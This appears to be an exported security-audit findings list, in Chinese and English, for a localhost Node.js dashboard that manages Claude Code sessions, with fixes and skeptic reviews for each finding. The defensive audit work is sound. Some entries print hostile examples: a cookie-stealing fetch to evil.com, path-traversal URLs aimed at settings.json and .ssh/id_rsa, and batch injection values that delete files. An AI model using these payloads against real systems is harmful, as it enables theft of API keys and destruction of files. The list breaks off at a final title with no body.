verified_findings.canonical_title: /api/sessions 和 /api/agents 每次请求都触发全量扫描并清空子 Agent 缓存
verified_findings.canonical_description: `getStatus()`、`getActivity()`、`tokenHeat`、`calcCost()` 的调用模式在三个位置几乎逐字重复：`routes/sessions.js` 的 `/api/sessions` 和 `/api/agents` 处理器、`routes/session.js` 的 `buildSessionDetailResponse`、以及 `watcher.js` 的 `processChanges`。每个位置都有 `s.status = scanner.getStatus(...)`、`s.activity = scanner.getActivity(...)` 等 4-5 行相同代码。未来如果增加新的计算维度（如 token 效率评分），需要修改所有位置。

sources.title: /api/sessions 和 /api/agents 每次请求都触发全量扫描并清空子 Agent 缓存
sources.description: 两个最频繁调用的 API 端点每次请求都调用 `scanner.scanSessions(shared.PROJECTS_DIR, [])` 做全目录遍历 + 增量解析，然后 `agents.scanSubAgents(sessions)` 再次遍历子 agent 目录。`scanSubAgents` 内部第一行就是 `shared.subAgentCache.clear()`，意味着前一次请求刚建立的缓存立刻被丢弃。在高频轮询场景下（前端每 3-5 秒刷新一次），这会导致大量重复的目录遍历和文件 stat/read 操作。
sources.rule_reference: Cache invalidation: separate read path (API) from write path (scanner/watcher)

sources.title: 会话状态/活跃度/热度计算在多个文件中重复实现
sources.description: `getStatus()`、`getActivity()`、`tokenHeat`、`calcCost()` 的调用模式在三个位置几乎逐字重复：`routes/sessions.js` 的 `/api/sessions` 和 `/api/agents` 处理器、`routes/session.js` 的 `buildSessionDetailResponse`、以及 `watcher.js` 的 `processChanges`。每个位置都有 `s.status = scanner.getStatus(...)`、`s.activity = scanner.getActivity(...)` 等 4-5 行相同代码。未来如果增加新的计算维度（如 token 效率评分），需要修改所有位置。
sources.rule_reference: DRY: Don't Repeat Yourself — extract repeated computation into a single source of truth

verified_findings.suggestion: 将会话扫描与 API 请求解耦。`/api/sessions` 不应触发扫描，而是直接返回内存中缓存的会话列表。扫描由 `watcher.js` 的文件变更事件和定时轮询驱动，结果写入缓存。API 端点仅读取缓存并返回。`scanSubAgents` 的 `clear()` 应改为增量更新（新增/更新检测到的 agent，移除已不存在的）。
verified_findings.skeptic_rationale: Confirmed: scanSessions() and scanSubAgents() are called on every /api/sessions and /api/agents request. However, this is a localhost-only single-user dashboard tool. The performance impact is real (filesystem scan per request) but bounded by the local disk and project count. No security impact — only latency. The 'clear cache' concern is a data consistency issue, not a security one. For a single-user localhost dev tool, this is a performance optimization opportunity, not a critical vulnerability.

verified_findings.canonical_title: Path Traversal in Snapshot API allows reading arbitrary .json files outside snapshots directory
verified_findings.canonical_description: snapId is extracted from the URL via decodeURI and directly joined into a file path with path.join(shared.SNAPSHOTS_DIR, snapId + '.json'). An attacker can use ../ sequences (URL-encoded as %2e%2e%2f or %2e%2e/) to traverse outside the snapshots directory and read any .json file on the filesystem. Combined with CORS: *, a malicious website can exfiltrate the user's ~/.claude/settings.json (which likely contains Anthropic API keys). The same traversal exists in the delete endpoint at line 47. Furthermore, the guard at line 20 that checks indexOf('/api/snapshot/delete') can be bypassed via URL-encoding: a URL like /api/snapshot/..%2F..%2Fsettings contains no literal 'delete' substring and passes straight through to the vulnerable read path.

sources.title: Path Traversal in Snapshot API allows reading arbitrary .json files outside snapshots directory
sources.description: snapId is extracted from the URL via decodeURI and directly joined into a file path with path.join(shared.SNAPSHOTS_DIR, snapId + '.json'). An attacker can use ../ sequences (URL-encoded as %2e%2e%2f or %2e%2e/) to traverse outside the snapshots directory and read any .json file on the filesystem. Combined with CORS: *, a malicious website can exfiltrate the user's ~/.claude/settings.json (which likely contains Anthropic API keys). The same traversal exists in the delete endpoint at line 47. Furthermore, the guard at line 20 that checks indexOf('/api/snapshot/delete') can be bypassed via URL-encoding: a URL like /api/snapshot/..%2F..%2Fsettings contains no literal 'delete' substring and passes straight through to the vulnerable read path.
sources.rule_reference: CWE-22: Improper Limitation of a Pathname to a Restricted Directory

verified_findings.suggestion: Validate snapId against a whitelist pattern (e.g. /^[a-zA-Z0-9_\-]+$/). Reject any input containing path separators or parent directory references. Alternatively, resolve the path and verify it stays within SNAPSHOTS_DIR using path.resolve and a startsWith check.
verified_findings.skeptic_rationale: Path traversal is real and exploitable. snapId is extracted from req.url via decodeURI(req.url.split('/api/snapshot/')[1]) with zero input validation. path.join(SNAPSHOTS_DIR, '../../../Users/Administrator/.claude/settings') + '.json' resolves to any .json file accessible to the server process. The .json suffix limits the scope but ~/.claude/ contains sensitive .json files (settings.json, session-config-map.json, agent-names.json). Combined with CORS '*' (M-015), this is remotely exploitable: a malicious website can use fetch() to read arbitrary .json files via localhost:5022 and exfiltrate the content. The code has no path.resolve + startsWith guard, no whitelist pattern. Severity P0 is arguably high for a localhost tool, but the CORS * amplifier makes it genuinely exploitable from the web — I cannot refute the core finding.

verified_findings.canonical_title: Snapshot delete endpoint has same path traversal as read endpoint
verified_findings.canonical_description: The delete handler at line 47 mirrors the path traversal vulnerability described in B-001. The delId parameter extracted from the URL is passed directly to deleteSnapshot which does: fs.unlinkSync(path.join(shared.SNAPSHOTS_DIR, id + '.json')). An attacker can traverse out of the snapshots directory and delete arbitrary .json files. Combined with the CORS misconfiguration (B-004), a malicious website can delete the user's configuration files, session data, or other critical .json files.

sources.title: Snapshot delete endpoint has same path traversal as read endpoint
sources.description: The delete handler at line 47 mirrors the path traversal vulnerability described in B-001. The delId parameter extracted from the URL is passed directly to deleteSnapshot which does: fs.unlinkSync(path.join(shared.SNAPSHOTS_DIR, id + '.json')). An attacker can traverse out of the snapshots directory and delete arbitrary .json files. Combined with the CORS misconfiguration (B-004), a malicious website can delete the user's configuration files, session data, or other critical .json files.
sources.rule_reference: CWE-22: Improper Limitation of a Pathname to a Restricted Directory

verified_findings.suggestion: Apply the same input validation as recommended in B-001: whitelist the snapshot ID format and verify the resolved path stays within SNAPSHOTS_DIR.
verified_findings.skeptic_rationale: Same path traversal pattern as M-012 but on the delete endpoint. delId = decodeURI(req.url.split('/api/snapshot/delete/')[1]) with no validation, passed directly to snapshot.deleteSnapshot(). The endpoint accepts GET requests (no method check), so a cross-origin simple GET request from a malicious website would trigger the deletion server-side regardless of CORS response readability — and with CORS '*', the attacker even gets confirmation. Deleting arbitrary .json files (settings.json, etc.) could corrupt the Claude configuration. Severity confirmed, though I note snapshot.deleteSnapshot() implementation is not visible — it may internally validate. Assuming it follows the same path.join pattern as the read endpoint, the traversal is valid.

verified_findings.canonical_title: HTTP 请求处理路径中大量使用同步文件 I/O 阻塞事件循环
verified_findings.canonical_description: 多个路由处理器在请求-响应周期内使用 `fs.readFileSync`、`fs.writeFileSync`、`fs.statSync` 等同步 API。在 Node.js 单线程模型中，这些调用会阻塞事件循环，导致所有其他请求（包括 SSE 连接的心跳）被延迟。受影响的路由包括：`/`（读 index.html）、`/import-localstorage`（读 import-data.json）、`/api/create-and-open`（读源会话文件 + 写入新会话文件）、`/api/session/:id`（读会话文件 + 读子 agent 文件）。对于可能达到数百 MB 的会话 JSONL 文件，阻塞时间可能长达数秒。

sources.title: HTTP 请求处理路径中大量使用同步文件 I/O 阻塞事件循环
sources.description: 多个路由处理器在请求-响应周期内使用 `fs.readFileSync`、`fs.writeFileSync`、`fs.statSync` 等同步 API。在 Node.js 单线程模型中，这些调用会阻塞事件循环，导致所有其他请求（包括 SSE 连接的心跳）被延迟。受影响的路由包括：`/`（读 index.html）、`/import-localstorage`（读 import-data.json）、`/api/create-and-open`（读源会话文件 + 写入新会话文件）、`/api/session/:id`（读会话文件 + 读子 agent 文件）。对于可能达到数百 MB 的会话 JSONL 文件，阻塞时间可能长达数秒。
sources.rule_reference: Node.js best practice: never block the event loop in request handlers

verified_findings.suggestion: 将文件 I/O 替换为异步版本：`fs.promises.readFile()`、`fs.promises.writeFile()`。对于 `/api/create-and-open` 这种需要多个文件操作的路径，可以使用 async/await 链式调用。对于 `/api/session/:id` 的尾部读取，可以使用 `fs.createReadStream` 流式处理。
verified_findings.skeptic_rationale: Confirmed: the provided code shows fs.readFileSync, fs.existsSync, fs.statSync, fs.openSync, fs.readSync used extensively in HTTP request handlers (index.js for HTML serving, session.js for buildSessionDetailResponse). These block the Node.js event loop. However: (1) This is a localhost single-user dashboard — blocking affects only one user. (2) The tail-read optimization in buildSessionDetailResponse limits reads to ~limit*1200+32768 bytes, not always full file. (3) No security impact, only performance. The suggestion to use async I/O is correct engineering practice but does not address a security vulnerability. Downgrade from P1 CRITICAL to P2 MAJOR.

verified_findings.canonical_title: Path Traversal via config parameter allows reading arbitrary files as configuration
verified_findings.canonical_description: The /api/create-and-open endpoint takes a config query parameter and—through spawnWithBat in routes/open.js—uses it to construct a file path: path.join(homeDir, '.claude', configName). Since configName comes from user input with no validation, an attacker can supply ../../Windows/win.ini or ../../.ssh/id_rsa to read arbitrary files. The content of the traversed file is then parsed as JSON and its env/model values are written into a bat file (triggering B-002's command injection as a second-stage payload). This same pattern affects the swapSettingsJson function at line 182 of open.js, where the config file content is written directly to settings.json.

sources.title: Path Traversal via config parameter allows reading arbitrary files as configuration
sources.description: The /api/create-and-open endpoint takes a config query parameter and—through spawnWithBat in routes/open.js—uses it to construct a file path: path.join(homeDir, '.claude', configName). Since configName comes from user input with no validation, an attacker can supply ../../Windows/win.ini or ../../.ssh/id_rsa to read arbitrary files. The content of the traversed file is then parsed as JSON and its env/model values are written into a bat file (triggering B-002's command injection as a second-stage payload). This same pattern affects the swapSettingsJson function at line 182 of open.js, where the config file content is written directly to settings.json.
sources.rule_reference: CWE-22: Improper Limitation of a Pathname to a Restricted Directory

verified_findings.suggestion: Validate configName against a strict pattern like /^[a-zA-Z0-9_\-.]+$/. Resolve the resulting path and verify it stays within the ~/.claude directory before reading. Never pass unsanitized user input to path.join for file operations.
verified_findings.skeptic_rationale: The referenced lines (index.js lines 95-103) are NOT present in the provided source code context — the snippet cuts off at the static files section. The finding describes a config parameter used in path.join without validation, but I cannot verify the actual code path, the route handler structure, or whether any validation exists elsewhere. The pattern described (path.join(homeDir, '.claude', configName) with unsanitized configName) would be a real path traversal if confirmed. However, I cannot verify or refute without seeing the actual code. Note: even if real, configName likely comes from sessionConfigMap (a server-side Map), not directly from user HTTP input, which could make this a non-issue.

verified_findings.canonical_title: settings.json 的 5 秒延迟恢复存在竞态条件
verified_findings.canonical_description: `launchSessionDirect` 先调用 `swapSettingsJson(configFile)` 将 settings.json 替换为目标配置，然后用 `setTimeout(..., 5000)` 恢复到 ORIGINAL_SETTINGS。如果两个会话在 5 秒内先后打开（T=0 打开会话A，T=3 打开会话B），T=5 时会话A的恢复逻辑会将 settings.json 覆盖为 ORIGINAL_SETTINGS，导致会话B（正在运行的 VSCode）丢失其配置。两个定时器互相不知道对方的存在。

sources.title: settings.json 的 5 秒延迟恢复存在竞态条件
sources.description: `launchSessionDirect` 先调用 `swapSettingsJson(configFile)` 将 settings.json 替换为目标配置，然后用 `setTimeout(..., 5000)` 恢复到 ORIGINAL_SETTINGS。如果两个会话在 5 秒内先后打开（T=0 打开会话A，T=3 打开会话B），T=5 时会话A的恢复逻辑会将 settings.json 覆盖为 ORIGINAL_SETTINGS，导致会话B（正在运行的 VSCode）丢失其配置。两个定时器互相不知道对方的存在。
sources.rule_reference: Race condition in file-based configuration swap

verified_findings.suggestion: 使用引用计数或配置栈：每次 swap 时递增计数器，每次 restore 时递减。仅当计数器归零时才真正写回 ORIGINAL_SETTINGS。或者用进程级互斥锁确保同一时间只有一个活跃的 settings swap。
verified_findings.skeptic_rationale: Confirmed: the swapSettingsJson mechanism uses a 5-second setTimeout to restore ORIGINAL_SETTINGS. If two sessions are launched within 5 seconds, the first timer fires and restores settings while the second session is still running with swapped settings. This is a real race condition. However: (1) It's a functional bug, not a security vulnerability — the worst case is a session running with wrong settings.json. (2) This is a localhost personal tool where concurrent session launches from the dashboard are the only trigger. (3) The impact is session configuration mismatch, not data corruption or privilege escalation. Downgrade from P0 BLOCKING to P2 MAJOR. M-019 is the same root cause.

verified_findings.canonical_title: Command Injection via unsanitized environment variables in BAT file generation
verified_findings.canonical_description: The spawnWithBat function reads a JSON config file and writes env var values directly into a .bat file using string concatenation: batLines.push('set ' + k + '=' + cfg.env[k]). On Windows, batch files interpret &, |, &&, ||, and %VAR% as command separators/operators. If an attacker controls the config file content—via the path traversal in B-003 or by any other means—they can inject arbitrary commands. For example, a config with env.ANTHROPIC_MODEL set to 'claude-sonnet&calc.exe' would execute calc.exe when the bat file runs. The ANTHROPIC_MODEL line at line 76 is equally vulnerable.

sources.title: Command Injection via unsanitized environment variables in BAT file generation
sources.description: The spawnWithBat function reads a JSON config file and writes env var values directly into a .bat file using string concatenation: batLines.push('set ' + k + '=' + cfg.env[k]). On Windows, batch files interpret &, |, &&, ||, and %VAR% as command separators/operators. If an attacker controls the config file content—via the path traversal in B-003 or by any other means—they can inject arbitrary commands. For example, a config with env.ANTHROPIC_MODEL set to 'claude-sonnet&calc.exe' would execute calc.exe when the bat file runs. The ANTHROPIC_MODEL line at line 76 is equally vulnerable.
sources.rule_reference: CWE-78: Improper Neutralization of Special Elements used in an OS Command

verified_findings.suggestion: Never construct batch files via string concatenation with user-controlled data. Use child_process.spawn directly with an explicit argument array (which bypasses shell interpretation), or at minimum validate all env values against a strict allowlist pattern (e.g. /^[a-zA-Z0-9_\-.:\/]+$/). For the bat file approach, wrap values in quotes and escape special characters: replace % with %%, & with ^&, | with ^|, etc. Better yet, switch to child_process.execFile or spawn with the env option to avoid the bat file entirely.
verified_findings.skeptic_rationale: The BAT file generation in spawnWithBat() concatenates env values from a config file into 'set KEY=VALUE' lines without escaping. If a config value contains '& del /f /q C:\*', it would execute arbitrary commands. However: (1) The config file path is path.join(homeDir, '.claude', configFile) where configFile comes from shared.sessionConfigMap.get(batId) — a server-side lookup, not user HTTP input. (2) The config file must exist on the local filesystem under ~/.claude/. (3) An attacker who can write files to ~/.claude/ already has local code execution — writing a malicious BAT file directly would be simpler. (4) The bat file is written to ~/.claude/temp/ and executed with 'start /min'. The attack surface requires local filesystem write access, which negates the need for command injection. Downgrade from P0 to P3.

verified_findings.canonical_title: buildRelationsResponse 同步读取并全量解析父会话文件，可能阻塞数秒
verified_findings.canonical_description: `buildRelationsResponse` 使用 `fs.readFileSync(relTarget._file, 'utf-8')` 将整个父会话 JSONL 文件读入内存，然后逐行解析全部内容两次（第一次匹配 dispatch 事件，第二次构建 waterfall trace）。对于大型会话文件（可达 100-500MB），同步读取会阻塞事件循环数秒。两次全量解析也是不必要的：dispatch 事件匹配和 waterfall trace 可以在一次遍历中完成。

sources.title: buildRelationsResponse 同步读取并全量解析父会话文件，可能阻塞数秒
sources.description: `buildRelationsResponse` 使用 `fs.readFileSync(relTarget._file, 'utf-8')` 将整个父会话 JSONL 文件读入内存，然后逐行解析全部内容两次（第一次匹配 dispatch 事件，第二次构建 waterfall trace）。对于大型会话文件（可达 100-500MB），同步读取会阻塞事件循环数秒。两次全量解析也是不必要的：dispatch 事件匹配和 waterfall trace 可以在一次遍历中完成。
sources.rule_reference: Node.js: never sync-read large files in the request path

verified_findings.suggestion: 将文件读取改为流式处理（`fs.createReadStream` + readline），在单次遍历中同时收集 dispatch 事件和构建 waterfall spans。如果必须全量加载，使用 `fs.promises.readFile` 并 `await`，避免阻塞。设置合理的行数上限（如 10000 行），超过时截断并返回提示。
verified_findings.skeptic_rationale: Same pattern as M-004. buildRelationsResponse() reads and parses the full parent session file synchronously. The code shows fs.readFileSync used for session detail. For large session files (multi-MB JSONL), this blocks the event loop. However, same mitigations as M-004: localhost single-user, no security impact. The suggestion for streaming is good engineering but not a security fix. Downgrade from P1 to P2.

verified_findings.canonical_title: import-localstorage 路由存在存储型 XSS 注入风险
verified_findings.canonical_description: `importData`（import-data.json 的原始内容）通过字符串拼接直接嵌入 `<script>` 标签体内：`var d=' + importData + ';`。若 JSON 文件被篡改为包含恶意 payload，如 `{"key":"value"};fetch('https://evil.com?c='+document.cookie);//}`，会在浏览器中执行任意 JavaScript。虽然利用需要服务器文件系统写入权限，但此模式违反了纵深防御原则，且 `<script>` 内嵌 JSON 本身就是危险的反模式。

sources.title: import-localstorage 路由存在存储型 XSS 注入风险
sources.description: `importData`（import-data.json 的原始内容）通过字符串拼接直接嵌入 `<script>` 标签体内：`var d=' + importData + ';`。若 JSON 文件被篡改为包含恶意 payload，如 `{"key":"value"};fetch('https://evil.com?c='+document.cookie);//}`，会在浏览器中执行任意 JavaScript。虽然利用需要服务器文件系统写入权限，但此模式违反了纵深防御原则，且 `<script>` 内嵌 JSON 本身就是危险的反模式。
sources.rule_reference: OWASP: Stored XSS Prevention; CWE-79

verified_findings.suggestion: 不要用字符串拼接生成内联脚本。改用服务端渲染将数据注入为 JSON 并设置 Content-Type，或通过单独的 API 端点返回 JSON 后由前端 fetch。最小改动方案：在服务端对 importData 做 JSON.parse 校验后，用 JSON.stringify 重新序列化后再拼接，确保不会注入可执行代码。
verified_findings.skeptic_rationale: Refuted on practical exploitability. The XSS pattern is real in code: importData is concatenated into an inline <script> without escaping. However, the attack chain has no practical entry point: (1) importData comes from import-data.json in the server's own __dirname — the attacker needs local filesystem write access to poison this file. (2) Even with CORS '*', the victim must navigate their browser to localhost:5022/import-localstorage — CORS allows cross-origin fetch from evil.com, but does NOT cause the browser to navigate to the target URL. (3) A cross-origin iframe load would execute the XSS in the localhost:5022 origin, but the parent (evil.com) cannot read the iframe content due to same-origin policy. (4) window.open() is blocked by popup blockers. The XSS is only exploitable if the user manually visits the URL, at which point the attacker already has local access. This is a code quality issue (should still be fixed), not an exploitable vulnerability.

verified_findings.canonical_title: CORS: Access-Control-Allow-Origin: * combined with no CSRF protection enables cross-origin data exfiltration
verified_findings.canonical_description: The server sets Access-Control-Allow-Origin: * on every response and has zero CSRF protection. All state-changing endpoints use GET requests (no method restriction). A malicious website can make fetch() requests to localhost:5022, and the browser will allow reading the response due to the wildcard CORS header. The attack chain: (1) user visits attacker.com, (2) attacker.com JS fetches /api/snapshot/../../settings via B-001's path traversal, (3) the response containing Anthropic API keys is readable by attacker.com, (4) attacker exfiltrates the keys. Additionally, attacker.com can trigger /api/create-and-open, /api/snapshot/delete/*, and /api/open-session/* endpoints to manipulate the user's local state.

sources.title: CORS: Access-Control-Allow-Origin: * combined with no CSRF protection enables cross-origin data exfiltration
sources.description: The server sets Access-Control-Allow-Origin: * on every response and has zero CSRF protection. All state-changing endpoints use GET requests (no method restriction). A malicious website can make fetch() requests to localhost:5022, and the browser will allow reading the response due to the wildcard CORS header. The attack chain: (1) user visits attacker.com, (2) attacker.com JS fetches /api/snapshot/../../settings via B-001's path traversal, (3) the response containing Anthropic API keys is readable by attacker.com, (4) attacker exfiltrates the keys. Additionally, attacker.com can trigger /api/create-and-open, /api/snapshot/delete/*, and /api/open-session/* endpoints to manipulate the user's local state.
sources.rule_reference: CWE-942: Permissive Cross-domain Policy with Untrusted Domains / CWE-352: Cross-Site Request Forgery

verified_findings.suggestion: Since this is a localhost-only tool, consider removing CORS entirely (browsers allow same-origin localhost requests without CORS) and serving the dashboard HTML from the same origin. If CORS must be kept, restrict to specific origins (not *). Add CSRF protection: require a custom header (X-Requested-With) for state-changing operations, or switch mutating endpoints from GET to POST/PUT/DELETE and validate Origin/Referer headers. Consider binding to 127.0.0.1 explicitly instead of 0.0.0.0.
verified_findings.skeptic_rationale: Confirmed and this is the root cause amplifier for several other findings. Access-Control-Allow-Origin: * on a localhost HTTP server means ANY website the user visits can: (1) Read all API responses (sessions, snapshots, agent data) via fetch. (2) Trigger GET-based side effects (terminal launch via /api/terminal-bat/, snapshot delete via /api/snapshot/delete/). (3) Exfiltrate local .json files via path traversal (M-012). The server handles no preflight OPTIONS, no CSRF tokens, no custom header requirements. Simple GET requests go through without preflight. However, I note: browsers have been adding Private Network Access checks for localhost (Chrome 104+), which requires preflight for requests from public origins to localhost. This partially mitigates in modern browsers. But the CORS header is still fundamentally wrong for a tool that performs file operations. Severity downgraded from P0 to P1 due to browser mitigations and localhost context.

verified_findings.canonical_title: import-data.json content is injected directly into inline <script> — no escaping
verified_findings.canonical_description: The /import-localstorage endpoint reads import-data.json and embeds it directly into an HTML <script> tag via string concatenation: 'var d=' + importData + ';'. If importData contains </script>, it would break out of the script tag and allow HTML injection. While this file is local, if an attacker gains write access to the server directory (e.g., via another vulnerability), they could plant a malicious import-data.json that executes arbitrary JavaScript in the context of localhost:5022, accessing localStorage data including API keys stored by the CC Panel.

sources.title: import-data.json content is injected directly into inline <script> — no escaping
sources.description: The /import-localstorage endpoint reads import-data.json and embeds it directly into an HTML <script> tag via string concatenation: 'var d=' + importData + ';'. If importData contains </script>, it would break out of the script tag and allow HTML injection. While this file is local, if an attacker gains write access to the server directory (e.g., via another vulnerability), they could plant a malicious import-data.json that executes arbitrary JavaScript in the context of localhost:5022, accessing localStorage data including API keys stored by the CC Panel.
sources.rule_reference: CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)

sources.title: import-data.json: missing Content-Type charset may enable encoding-based XSS
sources.description: The /import-localstorage endpoint returns Content-Type: text/html; charset=utf-8, which is fine, but the importData is read as utf-8 and embedded directly into a <script> tag without any escaping. If the import-data.json file is somehow encoded differently or contains UTF-7 content (historical IE vector), it could lead to script execution. Low risk on modern browsers but worth hardening.
sources.rule_reference: CWE-116: Improper Encoding or Escaping of Output

verified_findings.suggestion: JSON-stringify the import data for safe embedding: use JSON.stringify(JSON.parse(importData)) to ensure it's valid JSON and safely encoded. Use a CSP header to mitigate XSS risk. Alternatively, serve the import data via a separate API endpoint instead of embedding it inline.
verified_findings.skeptic_rationale: Duplicate of M-001. Both findings describe the exact same code path: importData from import-data.json is concatenated into an inline <script> tag. Same refutation applies — no practical exploit entry point exists. The suggestion to use JSON.stringify(JSON.parse(importData)) is a valid defensive improvement but addresses a non-exploitable issue.

verified_findings.canonical_title: swapSettingsJson writes attacker-controlled file content to settings.json without validation
verified_findings.canonical_description: The swapSettingsJson function reads a config file (whose path is partially attacker-controlled via B-003) and writes its contents directly to ~/.claude/settings.json. There is no validation that the content is valid JSON, no schema check, and no backup. If an attacker can point configFile to a large binary file, this could corrupt settings.json and potentially break the Claude Code CLI. The function also provides no mechanism to revert to the original settings after a failed or malicious swap (the ORIGINAL_SETTINGS snapshot exists in launchSessionDirect but not in swapSettingsJson itself).

sources.title: swapSettingsJson writes attacker-controlled file content to settings.json without validation
sources.description: The swapSettingsJson function reads a config file (whose path is partially attacker-controlled via B-003) and writes its contents directly to ~/.claude/settings.json. There is no validation that the content is valid JSON, no schema check, and no backup. If an attacker can point configFile to a large binary file, this could corrupt settings.json and potentially break the Claude Code CLI. The function also provides no mechanism to revert to the original settings after a failed or malicious swap (the ORIGINAL_SETTINGS snapshot exists in launchSessionDirect but not in swapSettingsJson itself).
sources.rule_reference: CWE-20: Improper Input Validation

verified_findings.suggestion: Validate that the target config content is valid JSON and conforms to the expected settings schema before writing. Create a backup of settings.json before overwriting (e.g., settings.json.bak). Consider using atomic writes (write to temp file, then rename) to prevent corruption on partial writes.
verified_findings.skeptic_rationale: swapSettingsJson writes config file content to ~/.claude/settings.json without schema validation. However: (1) The config file is read from ~/.claude/<configFile> — local filesystem. (2) The config content was written by the user or the dashboard itself. (3) An attacker who can write malicious JSON to ~/.claude/ config files already has local access. (4) The code does JSON.parse on the config file (in spawnWithBat), so invalid JSON would be caught. (5) ORIGINAL_SETTINGS is preserved for restoration. The lack of schema validation is a robustness issue, not a security vulnerability. Downgrade from P1 to P3.

verified_findings.canonical_title: 全局可变状态缺乏并发控制，多请求场景下存在数据竞争风险
verified_findings.canonical_description: `sessionCache`、`subAgentCache`、`fileOffsets`、`sseClients`、`snapshotList` 等全部作为 shared 模块的全局可变状态暴露。多个并发请求同时调用 `scanSessions` 会读写同一个 `sessionCache` Map，`processChanges`（由文件监控/定时器触发）也会并发修改。虽然 Node.js 单线程避免了真正的并行竞态，但异步交错执行仍可导致：缓存被部分更新时另一个请求读到不一致的中间状态、`fileOffsets` 和 `sessionCache` 不同步、`scanSubAgents` 的 `clear()` + 重建期间其他代码读到空缓存。

sources.title: 全局可变状态缺乏并发控制，多请求场景下存在数据竞争风险
sources.description: `sessionCache`、`subAgentCache`、`fileOffsets`、`sseClients`、`snapshotList` 等全部作为 shared 模块的全局可变状态暴露。多个并发请求同时调用 `scanSessions` 会读写同一个 `sessionCache` Map，`processChanges`（由文件监控/定时器触发）也会并发修改。虽然 Node.js 单线程避免了真正的并行竞态，但异步交错执行仍可导致：缓存被部分更新时另一个请求读到不一致的中间状态、`fileOffsets` 和 `sessionCache` 不同步、`scanSubAgents` 的 `clear()` + 重建期间其他代码读到空缓存。
sources.rule_reference: Shared mutable state is the root of many concurrency bugs

verified_findings.suggestion: 引入简单的读写锁或使用不可变更新模式（缓存更新时创建新 Map 再原子替换引用）。至少对 `scanSubAgents` 的 `clear()` → 重建过程加一个完成标志位，让消费者在重建期间等待或使用旧数据。考虑将缓存封装到独立的 CacheManager 类中，提供线程安全（async-safe）的 get/set/invalidate 接口。
verified_findings.skeptic_rationale: The finding claims 'data race risk' on global mutable state (sessionCache, subAgentCache Maps). This is misleading: Node.js is single-threaded — there are no traditional data races. Async operations can interleave (e.g., two scanSessions promises running concurrently), but Map operations themselves are atomic. The worst case is logical inconsistency: Request A's scan modifies the cache while Request B reads stale data. This causes incorrect dashboard display, not security compromise. The suggestion for read-write locks is unnecessary in a single-threaded runtime. Downgrade from P1 CRITICAL to P3 MINOR (data consistency cosmetic issue).

verified_findings.canonical_title: Math.random() used for session IDs and UUIDs — predictable and forgeable
verified_findings.canonical_description: Session IDs and UUIDs are generated using Math.random(), which is not cryptographically secure. In V8 (Node.js), Math.random() uses xorshift128+ which is predictable given a few observed outputs. An attacker who can observe generated session IDs could predict future session IDs and potentially hijack or interfere with new sessions. The PID used for session metadata is also generated with Math.random (line 172). This is used in three locations: line 109 (sessionId), line 128 (genUuid), and line 172 (fakePid).

sources.title: Math.random() used for session IDs and UUIDs — predictable and forgeable
sources.description: Session IDs and UUIDs are generated using Math.random(), which is not cryptographically secure. In V8 (Node.js), Math.random() uses xorshift128+ which is predictable given a few observed outputs. An attacker who can observe generated session IDs could predict future session IDs and potentially hijack or interfere with new sessions. The PID used for session metadata is also generated with Math.random (line 172). This is used in three locations: line 109 (sessionId), line 128 (genUuid), and line 172 (fakePid).
sources.rule_reference: CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)

verified_findings.code_snippet_good:
var crypto = require("crypto");
var sessionId = crypto.randomUUID();
verified_findings.suggestion: Use crypto.randomUUID() (available in Node.js 19+) or crypto.randomBytes(16).toString('hex') for UUID generation. For the fake PID, use the actual process PID or a cryptographically random number. Example: const crypto = require('crypto'); const sessionId = crypto.randomUUID();
verified_findings.skeptic_rationale: The referenced code (index.js lines 107-133) is NOT present in the provided source code context — the snippet cuts off well before those lines. Cannot verify whether Math.random() is used for session IDs. Additionally, even if confirmed: (1) Claude Code session IDs are UUIDs generated by the CLI, not by this dashboard. (2) If the dashboard generates display-only IDs (e.g., for SSE connections or snapshot names), Math.random() predictability has no security impact. (3) The 'fake PID' mentioned in the suggestion is likely a display element. Without seeing the actual code, I cannot confirm or refute.

verified_findings.canonical_title: URL-encoding bypass: guard checks operate on raw req.url, not decoded path
verified_findings.canonical_description: The snapshot detail guard at line 20 checks req.url.indexOf('/api/snapshot/delete') on the raw, un-decoded URL. However, the actual path parameter is decoded at line 21 using decodeURI(). An attacker can craft a URL like /api/snapshot/..%2F..%2Fsettings where the literal substring '/api/snapshot/delete' never appears, but after decodeURI the snapId becomes ../../settings. This bypasses the guard meant to exclude delete/create/rollback paths from the detail view handler. While this specific bypass leads to the detail (read) handler rather than delete, it demonstrates inconsistent URL handling that could be exploited if new guarded routes are added.

sources.title: URL-encoding bypass: guard checks operate on raw req.url, not decoded path
sources.description: The snapshot detail guard at line 20 checks req.url.indexOf('/api/snapshot/delete') on the raw, un-decoded URL. However, the actual path parameter is decoded at line 21 using decodeURI(). An attacker can craft a URL like /api/snapshot/..%2F..%2Fsettings where the literal substring '/api/snapshot/delete' never appears, but after decodeURI the snapId becomes ../../settings. This bypasses the guard meant to exclude delete/create/rollback paths from the detail view handler. While this specific bypass leads to the detail (read) handler rather than delete, it demonstrates inconsistent URL handling that could be exploited if new guarded routes are added.
sources.rule_reference: CWE-177: Improper Handling of URL Encoding (Double Encoding)

verified_findings.code_snippet_bad:
if (req.url.startsWith("/api/snapshot/") && req.url.indexOf("/api/snapshot/create") === -1 && req.url.indexOf("/api/snapshot/delete") === -1 && req.url.indexOf("/api/snapshot/rollback") === -1) {
  var snapId = decodeURI(req.url.split("/api/snapshot/")[1]);
verified_findings.suggestion: Parse req.url with the URL constructor (new URL(req.url, 'http://localhost')) to get the normalized pathname before doing route matching. This prevents encoding-based bypasses. Apply this consistently across all route handlers.
verified_findings.skeptic_rationale: Confirmed: route exclusion guards use raw req.url string matching (indexOf('/api/snapshot/create'), indexOf('/api/snapshot/delete')), but the snapId is extracted after decodeURI. Sending /api/snapshot/%64elete/../../settings bypasses the '/api/snapshot/delete' exclusion (%64 = 'd') because indexOf operates on the raw URL. After decodeURI, snapId becomes 'delete/../../settings', and path.join resolves this to outside SNAPSHOTS_DIR. This amplifies M-012/M-016 by bypassing the route guards. However, the practical impact is limited: (1) The bypass only affects which handler processes the request. (2) The traversal itself (M-012) is the real vulnerability. (3) The encoding bypass doesn't enable anything that M-012 doesn't already enable — an attacker would just use the detail handler directly. Downgrade from P1 to P2 as it's a code quality issue that amplifies M-012 but doesn't independently create new attack surface.

verified_findings.canonical_title: UUID 级联替换可能导致内容损坏
